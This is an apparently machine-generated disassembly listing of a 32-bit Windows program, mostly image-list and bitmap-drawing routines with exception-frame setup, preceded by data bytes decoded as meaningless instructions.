inc [ eax ]
add ah bh
mov [ esi ] cl
pop ecx
inc [ eax ]
add ah bh
mov [ esi ] cl
pop edx
inc [ eax ]
add ah bh
mov [ esi ] cl
pop ebx
inc [ eax ]
add ah bh
mov [ esi ] cl
pop esp
inc [ eax ]
add ah bh
mov [ esi ] cl
pop ebp
inc [ eax ]
add ah bh
mov [ esi ] cl
pop esi
inc [ eax ]
add ah bh
mov [ esi ] cl
pop edi
inc [ eax ]
add ah bh
mov [ esi ] cl
inc eax
inc [ eax ]
add ah bh
mov [ esi ] cl
inc ecx
inc [ eax ]
add ah bh
mov [ esi ] cl
inc edx
inc [ eax ]
add ah bh
mov [ esi ] cl
inc ebx
inc [ eax ]
add ah bh
mov [ esi ] cl
inc esp
inc [ eax ]
add ah bh
mov [ esi ] cl
inc ebp
inc [ eax ]
add ah bh
mov [ esi ] cl
inc esi
inc [ eax ]
add ah bh
mov [ esi ] cl
inc edi
inc [ eax ]
add ah bh
mov [ esi ] cl
dec eax
inc [ eax ]
add ah bh
mov [ esi ] cl
dec ecx
inc [ eax ]
add ah bh
mov [ esi ] cl
dec edx
inc [ eax ]
add ah bh
mov [ esi ] cl
dec ebx
inc [ eax ]
add ah bh
mov [ esi ] cl
dec esp
inc [ eax ]
add ah bh
mov [ esi ] cl
dec ebp
inc [ eax ]
add ah bh
mov [ esi ] cl
dec esi
inc [ eax ]
add ah bh
mov [ esi ] cl
dec edi
inc [ eax ]
add ah bh
mov [ esi ] cl
xor bh bh
add [ eax ] al
cld
mov [ esi ] cl
xor edi edi
add [ eax ] al
cld
mov [ esi ] cl
xor bh bh
add [ eax ] al
cld
mov [ esi ] cl
xor edi edi
add [ eax ] al
cld
mov [ esi ] cl
xor al 0xff
add [ eax ] al
cld
mov [ esi ] cl
xor eax 0xfc0000ff
mov [ esi ] cl
inc [ ss : eax ]
add ah bh
mov [ esi ] cl
aaa
inc [ eax ]
add ah bh
mov [ esi ] cl
cmp bh bh
add [ eax ] al
cld
mov [ esi ] cl
cmp edi edi
add [ eax ] al
cld
mov [ esi ] cl
cmp bh bh
add [ eax ] al
cld
mov [ esi ] cl
cmp edi edi
add [ eax ] al
cld
mov [ esi ] cl
cmp al 0xff
add [ eax ] al
cld
mov [ esi ] cl
cmp eax 0xfc0000ff
mov [ esi ] cl
inc [ eax ]
add ah bh
mov [ esi ] cl
aas
inc [ eax ]
add ah bh
mov [ esi ] cl
and bh bh
add [ eax ] al
cld
mov [ esi ] cl
and edi edi
add [ eax ] al
cld
mov [ esi ] cl
and bh bh
add [ eax ] al
cld
mov [ esi ] cl
and edi edi
add [ eax ] al
cld
mov [ esi ] cl
and al 0xff
add [ eax ] al
cld
mov [ esi ] cl
and eax 0xfc0000ff
mov [ esi ] cl
inc [ es : eax ]
add ah bh
mov [ esi ] cl
daa
inc [ eax ]
add ah bh
mov [ esi ] cl
sub bh bh
add [ eax ] al
cld
mov [ esi ] cl
sub edi edi
add [ eax ] al
cld
mov [ esi ] cl
sub bh bh
add [ eax ] al
cld
mov [ esi ] cl
sub edi edi
add [ eax ] al
cld
mov [ esi ] cl
sub al 0xff
add [ eax ] al
cld
mov [ esi ] cl
sub eax 0xfc0000ff
mov [ esi ] cl
inc [ cs : eax ]
add ah bh
mov [ esi ] cl
das
inc [ eax ]
add ah bh
mov [ esi ] cl
adc bh bh
add [ eax ] al
cld
mov [ esi ] cl
adc edi edi
add [ eax ] al
cld
mov [ esi ] cl
adc bh bh
add [ eax ] al
cld
mov [ esi ] cl
adc edi edi
add [ eax ] al
cld
mov [ esi ] cl
adc al 0xff
add [ eax ] al
cld
mov [ esi ] cl
adc eax 0xfc0000ff
mov [ esi ] cl
push ss
inc [ eax ]
add ah bh
mov [ esi ] cl
pop ss
inc [ eax ]
add ah bh
mov [ esi ] cl
sbb bh bh
add [ eax ] al
cld
mov [ esi ] cl
sbb edi edi
add [ eax ] al
cld
mov [ esi ] cl
sbb bh bh
add [ eax ] al
cld
mov [ esi ] cl
sbb edi edi
add [ eax ] al
cld
mov [ esi ] cl
sbb al 0xff
add [ eax ] al
cld
mov [ esi ] cl
sbb eax 0xfc0000ff
mov [ esi ] cl
push ds
inc [ eax ]
add ah bh
mov [ esi ] cl
pop ds
inc [ eax ]
add ah bh
mov [ esi ] cl
add bh bh
add [ eax ] al
cld
mov [ esi ] cl
add edi edi
add [ eax ] al
cld
mov [ esi ] cl
add bh bh
add [ eax ] al
cld
mov [ esi ] cl
add edi edi
add [ eax ] al
cld
mov [ esi ] cl
add al 0xff
add [ eax ] al
cld
mov [ esi ] cl
add eax 0x550000ff
mov ebp esp
xor eax eax
push ebp
push sub_44d389
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d390
retn
sub_44d3b8
or al [ eax ]
add [ eax ] al
jo r-xdata
push 0xd8004e16
mov [ esi ] cl
add [ eax ] al
add [ eax ] al
push ss
dec esi
add ah bl
mov [ esi ] cl
add [ eax ] al
add [ eax ] al
pushad
push ss
dec esi
add al ah
mov [ esi ] cl
add [ eax ] al
add [ eax ] al
pop esp
push ss
dec esi
add ah ah
mov [ esi ] cl
add [ eax ] al
add [ eax ] al
pop eax
push ss
dec esi
add al ch
mov [ esi ] cl
add [ eax ] al
add [ eax ] al
push esp
push ss
dec esi
add ah ch
mov [ esi ] cl
add [ eax ] al
add [ eax ] al
push eax
push ss
dec esi
add al dh
mov [ esi ] cl
add [ eax ] al
add [ eax ] al
dec esp
push ss
dec esi
add ah dh
mov [ esi ] cl
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44d460
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
dec esi
add al dl
mov [ esi ] cl
add [ eax ] al
add [ eax ] al
insb
push ss
dec esi
add ah dl
mov [ esi ] cl
add [ eax ] al
add [ eax ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44d467
retn
call sub_44d39c
sub_44eb9f
dec [ edx ]
add [ eax ] al
add [ ebx ] ah
insb
add [ edi ] dl
add [ gs : edx ] ah
inc edx
add [ eax + eax + 0x61 ] ch
add [ ebx ] ah
imul eax [ eax ] 0x0
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_44ec15
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ec1c
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0x8a
mov edx [ r-xdata ]
call sub_44a7e8
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_44ec20
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_4015fc
xor edx edx
mov [ eax + 0x24 ] edx
call sub_4015fc
xor edx edx
mov [ eax + 0x28 ] edx
call sub_4015fc
xor edx edx
mov [ eax + 0x2c ] edx
call sub_4015fc
xor edx edx
mov [ eax + 0x30 ] edx
call sub_4015fc
xor edx edx
mov [ eax + 0x34 ] edx
call sub_4015fc
xor edx edx
mov [ eax + 0x38 ] edx
call sub_4015fc
xor edx edx
mov [ eax + 0x3c ] edx
call sub_4015fc
xor edx edx
mov [ eax + 0x40 ] edx
call sub_4015fc
xor edx edx
mov [ eax + 0x44 ] edx
xor eax eax
mov [ rw-data ] eax
sub_44eca8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44ecec
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ecf3
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_44ed3e
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ edx + 0x155c0045 ] al
inc ebp
add [ eax ] dl
out 0x42 al
add al al
dec ebp
inc edx
add al bh
out 0x42 al
add [ eax - 0x14 ] cl
inc edx
add ah ch
or eax 0x1b9c0045
inc ebp
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ eax ] al
out dx al
inc esp
add [ eax ] cl
in eax dx
inc edx
add [ esp + ebp * 8 - 0x13bfffbe ] ch
inc edx
add [ eax - 0x14 ] dh
inc edx
add [ esp + ebp * 8 + 0x42 ] al
add [ eax + 0xf ] al
inc ebp
add ah al
sbb [ ebp ] eax
pop esp
sbb [ ebp ] eax
hlt
sub_44ee00
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4514b0
mov [ esi + 0x60 ] 0x0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_44ee3c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_44ee61
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ee68
retn
sub_44ee78
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
sub_44f0d7
test [ eax + eax + 0x1 ] 0x0
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al [ eax ]
or al [ ebx + 0x6f ]
insb
outsd
jb r-xdata
nop
jo r-xdata
test bl bl
je r-xdata
push 0xde2be890
add [ eax ] eax
mov edx eax
sub edx 0x1fffffff
je r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
or eax 0xffffffff
retn
dec edx
je r-xdata
mov eax 0xff000000
jmp r-xdata
retn
sub_44f134
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42e278
mov [ esi + 0x34 ] 0x10
mov [ esi + 0x30 ] 0x10
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_44f180
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor ecx ecx
xor edx edx
mov eax edi
call sub_42e278
mov [ edi + 0x34 ] esi
mov eax [ ebp + 0x8 ]
mov [ edi + 0x30 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_44f1d4
push ebx
push esi
push edi
call sub_44873c
mov ebx edx
mov edi eax
jmp r-xdata
mov esi [ edi + 0x4c ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_4247d4
mov edx eax
mov eax edi
call sub_44fe8c
mov eax [ edi + 0x50 ]
call sub_4481b0
mov eax edi
call sub_44f530
mov eax [ edi + 0x4c ]
call sub_4481b0
xor eax eax
mov [ edi + 0x4c ] eax
mov eax [ edi + 0x54 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_42e2c4
test bl bl
jle r-xdata
call sub_4481b0
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_4486e4
sub_44f240
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_44f2f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebx + 0x4c ] eax
mov eax [ ebx + 0x30 ]
cmp eax 0x1
jl r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
cmp eax 0x8000
jg r-xdata
cmp [ ebx + 0x34 ] 0x1
jge r-xdata
mov [ ebx + 0x38 ] 0x4
mov [ ebx + 0x41 ] 0x1
mov dl 0x2
mov eax ebx
call sub_44fe14
mov [ ebx + 0x43 ] 0x0
mov [ ebx + 0x44 ] 0x1fffffff
mov [ ebx + 0x48 ] 0x1fffffff
mov [ ebx + 0x68 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_471090
mov [ ebx + 0x50 ] eax
mov eax ebx
call sub_44f310
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f2f8
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
sub_44f310
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_44f3b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x50 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleBitmap
mov edx eax
mov eax ebx
call sub_4726b4
mov eax ebx
call sub_4719a8
mov eax [ eax + 0x14 ]
xor edx edx
call sub_46df1c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x30 ]
mov ecx eax
xor edx edx
xor eax eax
call sub_422fe4
lea eax [ ebp - 0x18 ]
push eax
mov eax ebx
call sub_4719a8
pop edx
call sub_46e300
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f3b8
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_44f3d4
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax [ ebx + 0x34 ]
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
push esp
lea eax [ esp + 0x8 ]
push eax
push edx
call ImageList_GetIconSize
mov eax [ esp + 0x4 ]
mov [ ebx + 0x34 ] eax
mov eax [ esp ]
mov [ ebx + 0x30 ] eax
mov eax ebx
call sub_44f310
pop ecx
pop edx
pop ebx
retn
sub_44f418
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
retn
mov [ esi + 0x34 ] edx
mov eax esi
call sub_44f2fc
test al al
je r-xdata
mov eax esi
call sub_44f788
mov eax esi
call sub_44f310
mov eax esi
mov si 0xffef
call sub_4483f8
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_44f45c
push esi
mov esi eax
cmp edx [ esi + 0x30 ]
je r-xdata
pop esi
retn
mov [ esi + 0x30 ] edx
mov eax esi
call sub_44f2fc
test al al
je r-xdata
mov eax esi
call sub_44f788
mov eax esi
call sub_44f310
mov eax esi
mov si 0xffef
call sub_4483f8
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
sub_44f4a0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f530
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44f3d4
mov [ ebx + 0x3c ] esi
mov eax ebx
mov si 0xffef
call sub_4483f8
sub_44f4dc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44fd9c
test esi esi
je r-xdata
mov eax [ ebx + 0x50 ]
mov edx [ eax ]
call [ edx + 0x70 ]
mov eax esi
call sub_471a14
cmp al 0x1
jne r-xdata
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x78 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x70 ]
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x70 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44f530
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_44f2fc
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x3c ] eax
mov eax ebx
mov si 0xffef
call sub_4483f8
pop esi
pop ebx
retn
cmp [ ebx + 0x42 ] 0x0
jne r-xdata
mov eax ebx
call sub_44f4cc
push eax
call ImageList_Destroy
sub_44f568
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_44f600
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x38 ]
push esi
push esi
movzx eax [ ebx + 0x68 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x41 ]
or eax [ edx * 4 + rw-data ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
call ImageList_Create
mov [ ebx + 0x3c ] eax
mov eax ebx
call sub_44f2fc
test al al
jne r-xdata
mov eax [ ebx + 0x44 ]
cmp eax 0x1fffffff
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f607
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
mov edx eax
mov eax ebx
call sub_44f794
sub_44f60c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_471090
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44f6bb
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_471090
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44f69e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44f304
mov ecx [ ebp - 0x10 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44f4dc
push eax
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44f4dc
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x3c ]
push eax
call ImageList_Add
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f6a5
mov eax [ ebp - 0x10 ]
call sub_4481b0
retn
sub_44f6d8
push ebx
mov ebx eax
mov eax ebx
call sub_44f2fc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_44f4cc
push eax
call ImageList_GetImageCount
pop ebx
retn
sub_44f6fc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_44f77b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_44f6d8
cmp esi eax
jl r-xdata
mov eax ebx
call sub_44f2fc
test al al
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
mov eax ebx
mov si 0xffef
call sub_4483f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f782
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
push esi
mov eax ebx
call sub_44f4cc
push eax
call ImageList_Remove
sub_44f794
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f2fc
test al al
je r-xdata
mov [ ebx + 0x44 ] esi
mov eax esi
call sub_44f0f4
push eax
mov eax [ ebx + 0x3c ]
push eax
call ImageList_SetBkColor
jmp r-xdata
mov eax ebx
mov si 0xffef
call sub_4483f8
pop esi
pop ebx
retn
sub_44f7cc
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x68 ]
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44f530
mov [ esi + 0x68 ] bl
mov eax esi
call sub_44f568
sub_44f7ec
push esi
mov esi eax
cmp ecx [ esi + 0x30 ]
jne r-xdata
mov [ esi + 0x30 ] ecx
mov [ esi + 0x34 ] edx
mov eax esi
call sub_44f2fc
test al al
je r-xdata
cmp edx [ esi + 0x34 ]
je r-xdata
mov eax esi
call sub_44f788
mov eax esi
call sub_44f310
mov eax esi
mov si 0xffef
call sub_4483f8
mov eax [ esi + 0x30 ]
push eax
mov eax [ esi + 0x34 ]
push eax
mov eax [ esi + 0x3c ]
push eax
call ImageList_SetIconSize
pop esi
retn
sub_44f838
push ebx
mov ebx eax
mov eax ebx
call sub_44f2fc
test al al
je r-xdata
mov eax [ ebx + 0x44 ]
pop ebx
retn
mov eax ebx
call sub_44f4cc
push eax
call ImageList_GetBkColor
call sub_44f114
pop ebx
retn
sub_44f860
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax ebx
call sub_44f2fc
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebx + 0x54 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x48 ]
call sub_44f0f4
push eax
mov eax ebx
call sub_44f838
call sub_44f0f4
push eax
push 0x0
push 0x0
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax edi
call sub_46e8c8
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44f4cc
push eax
call ImageList_DrawEx
jmp r-xdata
mov eax [ ebx + 0x54 ]
call sub_4719a8
mov eax [ eax + 0x14 ]
mov edx 0xffffff
call sub_46df1c
mov eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov ecx [ ebx + 0x34 ]
xor edx edx
xor eax eax
call sub_422fe4
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebx + 0x54 ]
call sub_4719a8
pop edx
call sub_46e300
push 0x0
push 0x0
push 0xffffffff
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x54 ]
call sub_4719a8
call sub_46e8c8
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_44f4cc
push eax
call ImageList_DrawEx
mov eax [ ebp + 0x10 ]
add eax [ ebx + 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp + 0x14 ]
add ecx [ ebx + 0x34 ]
mov edx [ ebp + 0x10 ]
mov eax [ ebp + 0x14 ]
call sub_422fe4
mov eax [ ebx + 0x54 ]
call sub_4719a8
call sub_46e8c8
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x14 ]
mov edx 0xff000014
call sub_46df1c
mov eax edi
call sub_46e8c8
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
inc eax
push eax
mov eax [ ebp + 0x14 ]
inc eax
push eax
push esi
call BitBlt
mov eax [ edi + 0x14 ]
mov edx 0xff000010
call sub_46df1c
mov eax edi
call sub_46e8c8
mov esi eax
push 0xffffff
push esi
call SetTextColor
push 0x0
push esi
call SetBkColor
push 0xe20746
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x30 ]
push eax
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
push esi
call BitBlt
mov dl 0x1
mov eax [ r-xdata ]
call sub_471090
mov esi eax
mov [ ebx + 0x54 ] esi
mov dl 0x1
mov eax esi
call sub_4728c4
mov edx [ ebx + 0x34 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_44fa34
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
movzx ebx [ eax + 0x40 ]
push ebx
movzx ebx [ eax + 0x43 ]
push ebx
movzx ebx [ ebp + 0x8 ]
push ebx
call sub_44fa5c
pop ebx
pop ebp
retn 0xc
sub_44fa5c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f2fc
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x18 ]
push eax
movzx eax [ ebp + 0x10 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebp + 0xc ]
or eax [ edx * 4 + rw-data ]
push eax
movzx eax [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp + 0x14 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44faa8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x34 ]
xor edx edx
xor eax eax
call sub_422fe4
mov eax [ ebp - 0x4 ]
call sub_450754
xor eax eax
push ebp
push sub_44fc41
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_471090
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_44fc24
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_471090
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_44fc07
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ ebp - 0x10 ]
call sub_4728c4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x34 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
push eax
call ImageList_GetImageCount
mov esi eax
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44fc0e
mov eax [ ebp - 0x10 ]
call sub_4481b0
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0xc ]
call sub_4719a8
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x14 ]
call sub_46e300
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
call sub_46e8c8
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov eax [ ebp - 0x10 ]
call sub_4719a8
mov [ ebp - 0x18 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
call sub_46e300
push 0x10
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
call sub_46e8c8
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
call ImageList_Draw
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_44f60c
cmp ebx edi
jne r-xdata
cmp edi 0xffffffff
je r-xdata
inc ebx
dec esi
jne r-xdata
sub_44fc50
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov esi edx
mov ebx eax
test esi esi
je r-xdata
or edi 0xffffffff
mov eax ebx
call sub_44f6d8
mov edi eax
mov eax esi
call sub_44f4cc
mov edx eax
mov ecx ebp
mov eax ebx
call sub_44faa8
jmp r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_44fc88
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax ebx
call sub_44f530
jmp r-xdata
mov edx esi
mov eax ebx
call sub_424dc0
mov dl 0x1
mov eax [ r-xdata ]
call sub_448180
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44fd03
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
